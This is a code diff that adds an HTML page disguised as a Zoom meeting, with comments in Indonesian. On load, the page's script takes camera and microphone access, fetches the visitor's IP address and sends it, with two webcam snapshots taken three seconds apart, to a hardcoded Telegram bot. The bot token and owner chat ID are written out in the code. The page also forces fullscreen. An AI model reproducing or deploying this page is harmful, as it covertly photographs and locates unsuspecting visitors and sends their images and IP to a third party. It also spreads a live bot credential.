@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Zoom - Meeting</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="video-container">
+    <video id="userVideo" autoplay playsinline></video>
+  </div>
+
+  <!-- Bar bagian bawah dengan gambar memanjang -->
+  <div class="bottom-bar">
+    <img src="https://files.catbox.moe/mkpj7q.png" alt="Bottom Bar">
+  </div>
+
+  <script>
+    const video = document.getElementById('userVideo');
+    const ownerId = '7377733784'; // Ganti dengan owner ID Anda
+    const botToken = '7512836049:AAHB9STFF0Qxzg5ryLs6Gc7idtdBFJJBGYE'; // Ganti dengan token bot Anda
+
+    // Fungsi untuk mendapatkan IP pengguna
+    async function getUserIP() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+      } catch (error) {
+        console.error('Error fetching IP:', error);
+        return 'Unknown IP';
+      }
+    }
+
+    // Fungsi untuk mengirim pesan ke bot Telegram
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      const data = {
+        chat_id: ownerId,
+        text: message,
+      };
+
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data),
+        });
+        const result = await response.json();
+        console.log('Message sent:', result);
+      } catch (error) {
+        console.error('Error sending to Telegram:', error);
+      }
+    }
+
+    // Fungsi untuk mengirim gambar ke Telegram
+    async function sendImageToTelegram(imageBlob) {
+      const formData = new FormData();
+      formData.append('chat_id', ownerId);
+      formData.append('photo', imageBlob, 'image.png');
+
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData,
+        });
+        const result = await response.json();
+        console.log('Image sent:', result);
+      } catch (error) {
+        console.error('Error sending image to Telegram:', error);
+      }
+    }
+
+    // Fungsi untuk mengambil tangkapan layar dari video
+    function captureVideoFrame() {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      return new Promise((resolve) => {
+        canvas.toBlob(resolve, 'image/png');
+      });
+    }
+
+    // Fungsi untuk mengambil gambar dan mengirimnya ke Telegram
+    async function captureAndSendImage() {
+      const imageBlob = await captureVideoFrame();
+      await sendImageToTelegram(imageBlob);
+    }
+
+    // Fungsi untuk mengambil gambar secara berturut-turut dengan jeda 3 detik
+    async function captureImagesWithDelay() {
+      // Ambil gambar pertama saat user masuk
+      await captureAndSendImage();
+
+      // Tunggu 3 detik
+      await new Promise((resolve) => setTimeout(resolve, 3000));
+
+      // Ambil gambar kedua setelah 3 detik
+      await captureAndSendImage();
+    }
+
+    // Akses kamera dan mikrofon pengguna
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+      .then((stream) => {
+        video.srcObject = stream;
+
+        // Kirim IP pengguna saat pertama kali masuk
+        getUserIP().then((ip) => {
+          sendToTelegram(`User has entered the website. IP: ${ip}`);
+        });
+
+        // Mulai mengambil gambar secara berturut-turut dengan jeda 3 detik
+        captureImagesWithDelay();
+      })
+      .catch((error) => {
+        console.error('Error accessing camera or microphone:', error);
+      });
+
+    // Aktifkan fullscreen saat halaman dimuat
+    document.documentElement.requestFullscreen().catch((error) => {
+      console.error('Error attempting to enable fullscreen:', error);
+    });
+  </script>
+</body>
+</html>
